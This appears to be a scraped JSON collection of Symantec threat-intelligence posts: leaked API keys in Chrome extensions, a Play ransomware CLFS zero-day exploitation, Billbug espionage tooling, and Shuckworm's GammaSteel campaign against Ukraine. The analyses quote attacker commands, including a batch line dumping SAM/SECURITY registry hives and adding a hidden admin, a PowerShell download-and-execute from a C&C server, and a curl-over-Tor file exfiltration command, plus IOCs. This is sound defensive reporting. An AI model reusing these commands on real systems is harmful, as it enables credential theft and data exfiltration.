libraryInboxSDK, which contains hardcoded credentials. These credentials, including API keys, are often exposed directly in the source code, leaving the extensions vulnerable to exploitation. For instance, the popular extensionAntidote Connector, with over 1,000,000 users, includes this third-party library for certain Gmail requests. In the example shown in Figure 5, we see how this API key is inserted directly into the header for communication with Google services. The problem stems from the fact that these hardcoded credentials are accessible to anyone who inspects the extension's code. In the case of InboxSDK, the Google API key is attached to each request using 'x-goog-api-key': googleApiKey. This makes it easy for an attacker to replicate the request headers, potentially allowing them to access or manipulate Gmail data, or even spam Google’s endpoints until the developer’s usage quota is exhausted or blacklisted. Given that this vulnerability exists in over 90 extensions using InboxSDK, the issue poses a wide-reaching threat that extends beyond just a single extension. Antidote Connector has since resolved the flaw in its latest version, removing the hard-coded key and adopting a more secure authentication flow. Watch2Gether(1,000,000+ users) leaks a Tenor GIF search API key (Figure 6). Although Tenor is “just GIFs,” usage can still cost money or trigger rate limits if spammed at scale. Moreover, spamming large volumes of search requests could cause the developer’s account to get banned from the Tenor API. This example shows that even a seemingly benign, entertainment-related key can lead to real consequences. Watch2Gether has since patched the problem in their latest release, eliminating the exposed key and moving authentication to a more secure flow. InTrust Wallet(1,000,000+ users), the code reveals a fiat ramps API key (Figure 7). This key is concatenated into a string used to produce a signature for crypto purchase quotes. If an attacker duplicates the extension’s logic, they could generate authentic-looking requests to buy or sell cryptocurrency on behalf of unsuspecting users, or intercept real transactions to manipulate the quotes. This scenario is especially concerning because it touches on financial data and transactions. Rounding out these examples,TravelArrow(300,000+ users) exposes a geolocation API key (Figure 8). Using this key, the extension makes location queries to ip-api.com. If attackers replicate the calls or send them in large volumes, they could drive up usage, potentially leaving theTravelArrowdeveloper with hefty bills or disabled API access. Even an API used primarily for location can be abused when key-based metering or quotas are in play. From GA4 analytics secrets to Azure speech keys, and from AWS S3 credentials to Google-specific tokens, each of these snippets demonstrates how a few lines of code can jeopardize an entire service. The solution: never store sensitive credentials on the client side. Instead, route privileged operations through a secure backend server, where secrets remain protected behind environment variables or secret management systems. Regular key rotation, usage monitoring, and the principle of least privilege will further minimize risk. By removing exposed secrets from their extensions, developers keep user trust intact, avoid financial losses, and ensure more reliable analytics for their products. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec recommends users follow these best practices to stay protected from browser extension threats: Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/chrome-extension-credentials"
  },
  {
    "title": "play ransomware zero day",
    "content": "Attackers linked to the Play ransomware operation deployed a zero-day privilege escalation exploit during an attempted attack against an organization in the U.S. The attack occurred prior to the disclosure and patching of a Windows elevation of privilege zero-day vulnerability (CVE-2025-29824) in the Common Log File System Driver (clfs.sys) on April 8, 2025. Although no ransomware payload was deployed in the intrusion, the attackers deployed theGrixba infostealer, which is a custom tool associated with Balloonfly, the attackers behind the Play ransomware operation. Balloonfly is a cybercrime group that has been active since at least June 2022 and uses the Play ransomware (also known as PlayCrypt) in attacks. The group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. The initial infection vector may have been a public facing Cisco ASA firewall. The attackers moved by unknown means to another, Windows machine on the targeted network.During the attack, the Balloonfly operators deployed a variety of samples and hacktools in addition to the Grixba infostealer and the exploit for CVE-2025-29824 on this machine. Some of the samples aren’t available to us at the moment of writing, but they were located in the Music folder with suspicious names masquerading as Palo Alto software (paloaltoconfig.exe, paloaltoconfig.dll) or, for example, 1day.exe. To gather information on all the available machines in the victims’ Active Directory, the attackers executed the following command and saved the output to C:\\Users\\[REDACTED]\\Music\\AllWindows.csv file. powershell Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\[REDACTED]\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 The attackers elevated privileges by exploiting a vulnerability in the Common Log File System (CLFS) kernel driver. In order to interact with the driver, the exploit calls the CreateFileW() API, passing the string \"\\\\.\\LOG:\\??\\C:\\ProgramData\\SkyPDF\\PDUDrv\" as the lpFileName parameter. During that API call, the Windows kernel allocates a new FILE_OBJECT structure to represent that particular instance of a file open operation and then sends a request to the CLFS driver as identified by the \"\\\\.\\LOG:\" filename prefix. The request is represented as an I/O Request Packet (IRP) with the major function code IRP_MJ_CREATE and instructs the driver to perform the actual open operation. Acting on this request, the driver allocates additional structures, including an undocumented structure, CClfsLogCcb. A pointer to the created CClfsLogCcb structure is stored in the FsContext2 field of the FILE_OBJECT structure, suggesting that the CClfsLogCcb structure could be a Context Control Block associated with that file open operation. Finally, the Windows kernel allocates a new file handle that refers to the created FILE_OBJECT structure. The exploit then attempts to perform two I/O operations around the same time on that file handle by calling different APIs from two threads. From the first thread, the exploit calls the CloseHandle() API. During that API call, the Windows kernel closes the only file handle associated with the FILE_OBJECT structure previously discussed. To notify the driver that all outstanding file handles for the FILE_OBJECT structure have been closed, the Windows kernel sends an I/O Request Packet (IRP) with the major function code IRP_MJ_CLEANUP to the CLFS driver. When handling this request, the vulnerable versions of the driver deallocate the structure CClfsLogCcb. From the second thread, the exploit calls the DeviceIoControl() API. The internal operations performed by the Windows kernel during that API call are determined by the sequence of operations across the two threads. In a particular scenario, the Windows kernel completes a lookup for the FILE_OBJECT structure referred to by the file handle during the DeviceIoControl() API call before the other thread closes the handle. The Windows kernel then sends an I/O Request Packet (IRP) with the major function code IRP_MJ_DEVICE_CONTROL to the CLFS driver that instructs the driver to perform the actual operation. That specific operation was picked when developing the exploit and involves the structure CClfsLogCcb. However, the Windows kernel does not guarantee the relative ordering of the IRP_MJ_CLEANUP request from the first thread and the IRP_MJ_DEVICE_CONTROL request from the second thread. For example, the IRP_MJ_CLEANUP request may complete first, deallocating the structure CClfsLogCcb, before the IRP_MJ_DEVICE_CONTROL request is sent do the driver. And then, when handling the IRP_MJ_DEVICE_CONTROL request, the CLFS driver uses the memory pointer from the FsContext2 field of the FILE_OBJECT structure, which still refers to the location of the already deallocated structure CClfsLogCcb, to operate on unexpected data. This is abused by the exploit to modify the kernel memory. During the execution of the exploit, two files are created in the path C:\\ProgramData\\SkyPDF. The first file, PDUDrv.blf, is a Common Log File System base log file and is an artifact created during exploitation. The second file, clssrv.inf, is a DLL that is injected into the winlogon.exe process. This DLL has the ability to drop two additional batch files. The first batch file, called servtask.bat, is stored in the “C:\\ProgramData” folder. This file is used to elevate privileges and dump the SAM, SYSTEM, and SECURITY Registry hives and to create a new user named LocalSvc and add it to the Administrator group. mkdir C:\\\\ProgramData\\\\Events & echo Yes | reg save hklm\\\\sam C:\\\\ProgramData\\\\Events\\\\Errors.evt & echo Yes | reg save hklm\\\\security C:\\\\ProgramData\\\\Events\\\\Logs.evt & echo Yes | reg save hklm\\\\system C:\\\\ProgramData\\\\Events\\\\Jobs.evt & net user /add LocalSvc Dc_34%gfE62cvsa & powershell.exe \\\"Add-LocalGroupMember -SID \\\"S-1-5-32-544\\\" -Member \\\"LocalSvc\\\"\\\" & net localgroup Administrators LocalSvc /add & reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\\" /v LocalSvc\" /d 0 /t REG_DWORD & icacls C:\\\\ProgramData\\\\Events /grant Everyone:F /inheritance:e /T & call C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\Events\\\\Errors.evt & del C:\\\\ProgramData\\\\Events\\\\Logs.evt & del C:\\\\ProgramData\\\\Events\\\\Jobs.evt & del C:\\\\ProgramData\\\\Events\\\\Tasks.evt & del C:\\\\ProgramData\\\\Events\\\\Tmp.evt & del C:\\\\ProgramData\\\\Events\\\\out.zip & schtasks /Create /F /xml C:\\\\ProgramData\\\\CacheTask.xml /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask & rmdir C:\\\\ProgramData\\\\Events & del C:\\\\ProgramData\\\\CacheTask.xml & del C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\servtask.bat The second batch file, named cmdpostfix.bat, is also created in the “C:\\ProgramData” folder and is used to clean up the artifacts created by the exploit: del C:\\\\ProgramData\\\\SkyPDF\\\\PDUDrv.blf & del C:\\\\ProgramData\\\\SkyPDF\\\\ClsSrv.inf & rmdir C:\\\\ProgramData\\\\SkyPDF Ultimately, the exploit executes the aforementioned batch files via the following commands: The exploit (or similar exploits) may have been in the hands of multiple actors prior to the patching of CVE-2025-29824. When patching the vulnerability, Microsoft said that it had beenexploited against a “small number of targets,” including organizations in the U.S., Venezuela, Spain, and Saudi Arabia. Microsoft said that the exploit had been deployed by the PipeMagic malware, which is often used by a group called Storm-2460 to deploy ransomware. The nature of the exploitation by Storm-2460 appears different from the Balloonfly-linked activity discovered by Symantec. Microsoft said that the exploit had been launched in memory from a dllhost.exe process. The exploitation discovered by Symantec was not fileless. While the use of zero-day vulnerabilities by ransomware actors is rare, it is not unprecedented.Last year Symantec found evidencethat attackers linked to the Black Basta ransomware may have been exploiting a recently patched Windows privilege escalation vulnerability (CVE-2024-26169) as a zero-day. That vulnerability was patched on March 12, 2024, and, at the time, Microsoft said there was no evidence of its exploitation in the wild. However, analysis of an exploit tool revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 6030c4381b8b5d5c5734341292316723a89f1bdbd2d10bb67c4d06b1242afd05 - gt_net.exe - Infostealer.Grixba 858efe4f9037e5efebadaaa70aa8ad096f7244c4c4aeade72c51ddad23d05bfe – go.exe — CVE-2025-29824 exploit 9c21adbcb2888daf14ef55c4fa1f41eaa6cbfbe20d85c3e1da61a96a53ba18f9 — clssrv.inf — Exploit DLL payload 6d7374b4f977f689389c7155192b5db70ee44a7645625ecf8163c00da8828388 — cmdpostfix.bat — Batch file b2cba01ae6707ce694073018d948f82340b9c41fb2b2bc49769f9a0be37071e1 — servtask.bat — Batch file 293b455b5b7e1c2063a8781f3c169cf8ef2b1d06e6b7a086b7b44f37f55729bd — paloaltoconfig.dll — Unknown file af260c172baffd0e8b2671fd0c84e607ac9b2c8beb57df43cf5df6e103cbb7ad — paloaltoconfig.exe — Unknown file 430d1364d0d0a60facd9b73e674faddf63a8f77649cd10ba855df7e49189980b — 1day.exe — Unknown file ba05d05d51d4f7bfceb3821a3754e7432248f5c3d5a450391a0631d56bbce4c2 — fappsettingslib.dll — Unknown file b3ee068bf282575ac7eb715dd779254889e0b8a55aba2b7a1700fc8aa4dcb1da — w64stdlib.dll — Unknown file The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/play-ransomware-zero-day"
  },
  {
    "title": "billbug china espionage",
    "content": "The Billbug espionage group (aka Lotus Blossom, Lotus Panda, Bronze Elgin) compromised multiple organizations in a single Southeast Asian country during an intrusion campaign that ran between August 2024 and February 2025. Targets included a government ministry, an air traffic control organization, a telecoms operator, and a construction company. In addition to this, the group staged an intrusion against a news agency located in another country in Southeast Asia and an air freight organization located in another neighboring country. The attacks involved the use of multiple new custom tools, including loaders, credential stealers, and a reverse SSH tool. The campaign is one of the findings documented in the Threat Hunter Team’s new whitepaper -Relentless Force: China-linked Espionage Actors The activity appears to be acontinuation of a campaign first documented by Symantec in December 2024, where multiple high-profile organizations in Southeast Asian countries were targeted. While it was clear that Chinese actors were behind the attacks, attribution to a single actor could not be determined. However,a recent blog by Cisco Talosdetailing recent Billbug activity contained indicators of compromise (IOCs) used in this campaign, indicating that it was the work of Billbug. In several of the intrusions, the attackers used legitimate software from Trend Micro and Bitdefender to load malicious loaders, using the technique known as DLL sideloading. One of the legitimate executables used for sideloading was a Trend Micro binary named tmdbglog.exe (SHA246: f9036b967aaadf51fe0a7017c87086c7839be73efabb234e2c21885a6840343e). This was used to sideload a malicious DLL named tmdglog.dll (SHA256: b75a161caab0a90ef5ce57b889534b5809af3ce2f566af79da9184eaa41135bd). Analysis of tmdglog.dll revealed that it was a loader that read, decrypted, and executed the contents of the file C:\\Windows\\temp\\TmDebug.log. It then logged the execution progress to C:\\Windows\\Temp\\VT001.tmp. Another legitimate executable used was a Bitdefender binary named bds.exe (SHA256: 2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924). This was used to sideload a malicious DLL named log.dll (SHA256: 54f0eaf2c0a3f79c5f95ef5d0c4c9ff30a727ccd08575e97cce278577d106f6b). Analysis of log.dll concluded that it was another loader which read and decrypted the contents of the file winnt.config. It then started the process C:\\Windows\\system32\\systray.exe and injected the decrypted contents to it. Several variants of log.dll were used in the campaign, but only one was retrieved for analysis. The same Bitdefender binary was also used to sideload a file named sqlresourceloader.dll, which was also not retrieved. It is unknown if this is related to the loader analyzed or a different tool. The attackers also used a new variant of the Sagerunex backdoor, a custom tool that is exclusively used by Billbug. The variant (SHA256: 4b430e9e43611aa67263f03fd42207c8ad06267d9b971db876b6e62c19a0805e) appears to be related to variants of Sagerunex documented by Cisco in February 2025. As documented by Cisco, the attackers created a persistence mechanism by modifying the registry to ensure that it would run as a service. Among the new tools deployed were two designed to steal credentials from the Chrome web browser. Deployed tools included: The attackers deployedthe publicly available Zrokpeer-to-peer tool, using thesharing function of the toolin order to provide remote access to services that were exposed internally. Another legitimate tool used was called datechanger.exe (SHA256: b337a3b55e9f6d72e22fe55aba4105805bb0cf121087a3f6c79850705593d904). It is capable of changing timestamps for files, presumably to muddy the waters for incident analysts. Active since at least 2009, Billbug has largely focused on Southeast Asia, targeting governments and military organizations in particular. The group first came to public attention in 2015 whenPalo Alto published a reporton its activities in Southeast Asia, linking it to over 50 different attacks over a period of three years. Its campaigns used spear-phishing emails and convincing lure documents to deliver the custom Trensil (aka Elise) Trojan. In 2018, Symantecpublished an investigation on the group’s activity, detailing an attack on a large telecoms operator in Southeast Asia. The attackers used PsExec to install a previously unknown piece of malware (Infostealer.Catchamas). The discovery of this attack led to the discovery of further attacks against the communications, geospatial imaging, and defense sectors, both in the U.S. and Southeast Asia. During that investigation, Symantec referred to the actor as Thrip, but we subsequently determined that Thrip and Billbug were most likely the same group and began tracking all activity under the Billbug name. In 2019,Symantec published another report on the group, detailing the use of two previously unseen backdoors known as Hannotog (Backdoor.Hannotog) and Sagerunex (Backdoor.Sagerunex). Targets of this campaign included at least 12 organizations in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. In addition to military targets, the group also attacked organizations in the maritime communications, media, and education sectors. Billbug remained active in subsequent years. In November 2022,Symantec published new research on the group, highlighting an attack on a digital certificate authority in an Asian country. The targeting of a certificate authority was notable because the attackers could have accessed certificates and used them to sign malware, helping them to evade detection. Compromised certificates could also potentially be used to intercept HTTPS traffic. Learn more about Billbug and other Chinese threat actors in our comprehensive whitepaper:Relentless Force: China-linked Espionage Actors For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 4b430e9e43611aa67263f03fd42207c8ad06267d9b971db876b6e62c19a0805e – Sagerunex 2e1c25bf7e2ce2d554fca51291eaeb90c1b7c374410e7656a48af1c0afa34db4 – ChromeKatz 6efb16aa4fd785f80914e110a4e78d3d430b18cbdd6ebd5e81f904dd58baae61 – ChromeKatz ea87d504aff24f7daf026008fa1043cb38077eccec9c15bbe24919fc413ec7c7 – ChromeKatz e3869a6b82e4cf54cc25c46f2324c4bd2411222fd19054d114e7ebd32ca32cd1 – CredentialKatz 29d31cfc4746493730cda891cf88c84f4d2e5c630f61b861acc31f4904c5b16d – CredentialKatz 461f0803b67799da8548ebfd979053fb99cf110f40ac3fc073c3183e2f6e9ced – Reverse SSH tool b337a3b55e9f6d72e22fe55aba4105805bb0cf121087a3f6c79850705593d904 – Date changer 54f0eaf2c0a3f79c5f95ef5d0c4c9ff30a727ccd08575e97cce278577d106f6b – Loader b75a161caab0a90ef5ce57b889534b5809af3ce2f566af79da9184eaa41135bd – Loader becbfc26aef38e669907a5e454655dc9699085ca9a4e5f6ccd3fe12cde5e0594 – Suspected loader The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/billbug-china-espionage"
  },
  {
    "title": "shuckworm ukraine gammasteel",
    "content": "Shuckworm’s relentless focus on Ukraine has continued into 2025, with the group targeting the military mission of a Western country based in the Eastern European nation. This first activity in this campaign occurred in February 2025, and it continued into March. The initial infection vector used by the attackers appears to have been an infected removable drive. In this campaign, the attackers appear to be using an updated version of their GammaSteel tool. GammaSteel is an infostealer that exfiltrates data from victim networks. The attackers are seen using various methods for data exfiltration, including using thewrite.asweb service for possible exfiltration. They are also seen using cURL alongside Tor as a backup method of data exfiltration. cURL is anopen-source command-line toolthat can be used to transfer data to and from a server and is frequently leveraged by malicious actors. This campaign also seems to demonstrate a move by Shuckworm from using a lot of VBS scripts to using more PowerShell-based tools, particularly later in its attack chain. It is likely leveraging PowerShell for obfuscation and also because it allows it to store scripts in the registry. GammaSteel was deployed following a complex, multi-staged attack chain, with frequent use of obfuscation. The process was most likely designed to minimize the risk of detection. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked espionage group that has almost exclusively focused its operations on government, law enforcement, and defense organizations in Ukraine since it first appeared in 2013. It is believed that Shuckwormoperates on behalf of the Russian Federal Security Service (FSB). The initial infection in this campaign appeared to occur on February 26 with the creation of a Windows Registry value under theUserAssistkey that indicates the infection may have started from an external drive and an LNK file namedD:\\files.lnk. The UserAssist registry key stores the applications, files, links, and other objects accessed by the user through Windows Explorer stored in a ROT13 format. HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count\\Q:\\svyrf.yax After that event, explorer.exe launched a mshta.exe process executing the following command: \"C:\\Windows\\System32\\mshta.exe\" javascript:eval('w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"explorer files\");w.run(\"wscript.exe //e:vbScript \\~.drv\");window.close()') Then, the following commands were executed: \"C:\\Windows\\System32\\wscript.exe\" //e:vbScript ~.drv \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\keepoAI.hta\" The ~.drv file is highly obfuscated, but it seems to be used to create two files and execute them: C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms c:\\users\\public\\ntuser.dat.tmcontainer00000000000000000002.regtrans-ms The first file (NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms) is used to contact the command and control (C&C) server and stay in constant contact with it. First, it searches for a ping record with a WMI query: \"Select * From Win32_PingStatus where Address = 'mil.gov.ua'\" to the address \"mil.gov.ua\", If there is no ping record or the ping is not successful, it will finish execution. It then checks if the C&C server address is stored in the value: HKEY_CURRENT_USER\\\\Console\\\\WindowsUpdates If not, it will run different methods to obtain the final C&C server address. The script leverages different legitimate services to try to resolve the C&C server, including: In this instance, the attackers were able to obtain a C&C server address and contact it: From hxxps://telegra[.]ph/Mark-01-20-5 we also found the following C&C server: The C&C server is similar to others that have been used by Shuckworm in the past, as shown in aninvestigation by Recorded Futurewhere the group leveraged Cloudflare tunnels for their C&C infrastructure. From t[.]me/futar123 we also found the C&C 107.189.19[.]137 from recovered text: The second file mentioned previously (NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms) appears to be designed to modify the following registry keys to not show hidden and system files: HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt It then starts to infect any removable drives and network drives by creating shortcut files (.lnk) for every folder to execute the first malicious mshta.exe command (wscript.exe //e:vbScript ~.drv)and hide the folder. We found an array of possible file names in Ukrainian, but it is unknown from the script what these files may do. (\"План проведення\", \"Спецповідомлення\", \"лиcт дo\", \"СПЕЦПЕРЕВІРКА\", \"Рапорт поранення\", \"вiдряджeння\", \"БОЙОВЕ РОЗПОРЯДЖЕННЯ ППО\", \"Рішення командира на оборону\", \"Зобовязання\", \"бойовий розрахунок\", \"Супровід ГУР\", \"Інформація щодо загиблих\", \"БМП\", \"продовження контракту\", \"Довідка про зустріч з джерелом\") (\"Conduct plan\", \"Special message\", \"letter to\", \"SPECIAL INSPECTION\", \"Wound report\", \"deployment\", \"AIR DEFENSE COMBAT ORDER\", \"Commander's decision on defense\", \"Obligation\", \"Combat calculation\", \"GUR support\", \"Information on the dead\", \"BMP\", \"contract extension\", \"Reference about meeting with the source\") On March 1, an array of activity occurred on the targeted network. On one machine, the malicious VBscript—C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms—is executed via WScript.exe. It then reaches out to the following C&C URL: The malicious script also exfiltrates some data from the infected machine, such as the username, hostname, and the disk serial number via the User-Agent HTTP request header: IServerXMLHTTPRequest2.setRequestHeader(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 ([USERNAME]::[HOSTNAME]_[DISK_SERIAL_NUMBER]::/.nJudged/.TML,\"); It then saves the valid C&C server address under the registry value: \"HKEY_CURRENT_USER\\Console\\WindowsUpdates\": IWshShell3.RegWrite(\"HKEY_CURRENT_USER\\Console\\WindowsUpdates\", \"http://172.104.187.254/mood/1/3/2025/confer.html?=[REMOVED]\", \"REG_SZ\"); The code received from the server is Base64 encoded and obfuscated and it launches the following PowerShell command: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" sleep 15;$url='http://64.23.190.235/getinfo.php';$discord = (New-Object system.Net.WebClient).downloadString($url); $discord | iex The C&C server also downloads an obfuscated new version of the same script but this time with hardcoded C&C addresses: This new malicious VBScript file is stored in the following path: After a connection to the new C&C server(hxxps://nav-ni-furnished-handy.trycloudflare[.]com), two new PowerShell scripts are received. The first script appears to be a reconnaissance tool, which is used to create a screenshot of the machine, run a systeminfo command, get the name of the security software running on the machine, get the available space from all disks, get the VolumeSerialNumber, the directory tree of the Desktop folder, a list of files in the Desktop folder, and a list of the running processes. It then sends all the collected information to the C&C server hxxp://64.23.190[.]235/getinfo[.]php. The following is an excerpt of the PowerShell script: [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") $ScreenBounds = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize; $arw = \"Wi\",\"dt\",\"h\"; $arh = \"H\",\"ei\",\"g\",\"ht\"; $he = $arh -join \"\" ; $w = $ScreenBounds.\"$wi\" + 1 - 1; $h = $ScreenBounds.\"$he\" + 1 - 1; $Image = New-Object System.Drawing.Bitmap($w , $h); $CopyScreen = [System.Drawing.Graphics]::FromImage($Image); $process = $(ps | foreach-Object{$a = $_.ProcessName; $a+\"`n\"} ); $Point = New-Object System.Drawing.Point(1, 1); $ip =\"64.23.190.235\"; $nk = $nk + \"putern\" + \"ame\"; $comp = (Get-Item -Path env:\\$nk).Value; $dasda = $dasda +\"lume\" $dasda =$dasda +\"Seria\" $dasda =$dasda +\"lNum\" $dasda =$dasda +\"ber\" $Path = \"$env:appdata\\\"; $name = $path + \"$(get-date -f yyyy.MM.dd_h\\h_m\\m)\"+\".jpg\"; if(![System.IO.Directory]::Exists($Path)){ New-Item -ItemType Directory $Path } $Point = [Drawing.Point]::Empty $NameValueCollection = New-Object System.Collections.Specialized.NameValueCollection; $httptext =\"http://\"; $infotext = \"/i\"+$nf+ $op; The second PowerShell script received from the C&C server stores the payload obfuscated and split by functions in different values in the registry. Set-ItemProperty -Path 'HKCU:\\Software' -Name 'LGJuKKhrjgwffjmc1jzSkzT' -Value 'DQAKACAAIAAgACAAdAByAHkAewB7AA0ACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAFQAZQB4AHQAKAB7ADAAfQAsACAAewAxAH0AKQA7AA0ACgAgACAAIAAgAH0AfQANAAoAIAAgACAAIABjAGEAdABjAGgAewB7AA0ACgANAAoAIAAgACAAIAB9AH0ADQAKAAkA'; Set-ItemProperty -Path 'HKCU:\\Software' -Name 'wOVzQC0zskdwz2xbraoXftD' -Value 'DQAKACAAIAAgACAAdAByAHkAewB7AA0ACgAJAAkAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARgBpAGwAZQBTAHkAcwB0AGUAbQANAAoACQAJAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBaAGkAcABGAGkAbABlAF0AOgA6AEUAeAB0AHIAYQBjAHQAVABvAEQAaQByAGUAYwB0AG8AcgB5ACgAewAwAH0ALAAgAHsAMQB9ACkAOwANAAoACQB9AH0ADQAKAAkAYwBhAHQAYwBoAHsAewANAAoACQB9AH0ADQAKAAkA'; The following is an example of one of the PowerShell functions stored in the registry: $jfecWp1fljll0j004nzEODg = \"www.phlovel.ru\"; $odPSSiffq0huyxichtGXAWo = [System.Net.Dns]::gethostentry($jfecWp1fljll0j004nzEODg).addresslist[0]; $YywyAi53bcklkjtplAEvUrl = $odPSSiffq0huyxichtGXAWo.tostring(); return $YywyAi53bcklkjtplAEvUrl; This stage appears to be the attackers’ final payload—a PowerShell version of Shuckworm’s known GammaSteel tool. This tool enumerates all the files in the following folders: It exfiltrates files that match a hardcoded extension list: It ignores folders that contain the following strings: It uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file, which is something previous versions of the GammaSteel malware also did. \"C:\\Windows\\system32\\certutil.exe\" -hashfile \"[REDACTED].txt\" MD5 This version of GammaSteel tries to exfiltrate the files via a PowerShell web request, but if it fails, as a fallback method, it uses cURL with a Tor network proxy to obfuscate the origin IP: \"C:\\Windows\\system32\\curl.exe\" -x socks5://127.0.0.1:9050 -v -k -F o2PVasTpH2AxGgiYBSjb=[REDACTED] -F AWpCbqMhrFvHx4QJkAXlj=@[REDACTED].pdf https://85.92.111.12 The first post parameter contains some information regarding the machine, like the hostname, the drive serial number, and the path of the exfiltrated file: jhEOKsGyR07pNfM::1000::PAikOnBfhsr::[REDACTED].pdf::Bqf4wlnsrc::22.02.2025 14:18:24::mU0p1uNxlLvd::508383::GHCcfPBq1NwgZ::boML6spmjPF::Ti5vCm4hcu::[REDACTED]**2863E630::S3apqcC4J20QH It also contained some incomplete code that seems to leverage the web servicewrite.asto possibly exfiltrate some information from the computer: $REGWeqlhlmtvuskihNeRgib = \"https://write.as/api/posts\"; $XUqKFBjm5dwgqh5aljmHuTC = '{{\"body\": \"This is a post.\", \"title\": \"My First Post\"}}'; $aFKGHf31o2g4jrm00nkAQdv = @{{\"Content-Type\" = \"application/json\"}}; $KMTPQV1jeau2lslqmzcNPyG = Invoke-WebRequest -Uri $REGWeqlhlmtvuskihNeRgib -Method \"POST\" -Body $XUqKFBjm5dwgqh5aljmHuTC -Headers $aFKGHf31o2g4jrm00nkAQdv; To obtain persistence, the malware registers itself in the Run registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[USERNAME] This attack does mark something of an increase in sophistication for Shuckworm, which appears to be less skilled than other Russian actors, though it compensates for this with its relentless focus on targets in Ukraine. While the group does not appear to have access to the same skill set as some other Russian groups, Shuckworm does now appear to be trying to compensate for this by continually making minor modifications to the code it uses, adding obfuscation, and leveraging legitimate web services, all to try lower the risk of detection. This campaign also demonstrates that the group remains laser-focused on targeting entities within Ukraine for espionage purposes. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 714aeb3d778bbd03d0c9eaa827ae8c91199ef07d916405b7f4acd470f9a2a437 90ec1f4dd69c84c3eb0b2cada4a31168de278eff9b21cb20551ec39d5bcb9da2 position.crudoes[.]ru areas-apps-civic-loving.trycloudflare[.]com des-cinema-democrat-san.trycloudflare[.]com distributors-marble-saddam-much.trycloudflare[.]com nav-ni-furnished-handy.trycloudflare[.]com surfing-programmer-morris-mortality.trycloudflare[.]com affects-periodic-explorer-broadband.trycloudflare[.]com abraham-lc-happened-ericsson.trycloudflare[.]com argentina-references-rapid-selecting.trycloudflare[.]com beverly-cups-soft-concentrate.trycloudflare[.]com boxes-harvest-cameroon-uniform.trycloudflare[.]com cables-tension-bronze-hans.trycloudflare[.]com convergence-suffering-reel-ingredients.trycloudflare[.]com detector-excluded-knowledgestorm-two.trycloudflare[.]com fee-ss-launch-remedies.trycloudflare[.]com ff-susan-config-mod.trycloudflare[.]com 